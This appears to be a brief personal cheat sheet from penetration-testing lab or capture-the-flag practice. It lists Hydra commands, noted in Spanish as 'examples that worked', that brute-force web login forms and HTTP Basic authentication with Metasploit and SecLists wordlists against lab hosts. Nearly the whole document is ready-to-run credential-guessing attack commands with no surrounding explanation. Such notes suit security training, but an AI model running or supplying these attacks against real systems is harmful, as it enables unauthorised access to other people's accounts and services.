`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-post-form "/acp/login:login_name=^USER^&login_psw=^PASS^:F=Login"


Ejemplos que funcionaron:

```bash
hydra -l admin -P wordlist.txt 10.129.155.168 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password."
```

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P passwords.txt 127.0.0.1 http-get "/" -m "Authorization: Basic ^USER^:^PASS^" -s 8000
```

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P passwords.txt 127.0.0.1 http-get "/" -m "Authorization: Basic ^USER^:^PASS^" -s 8000
```
`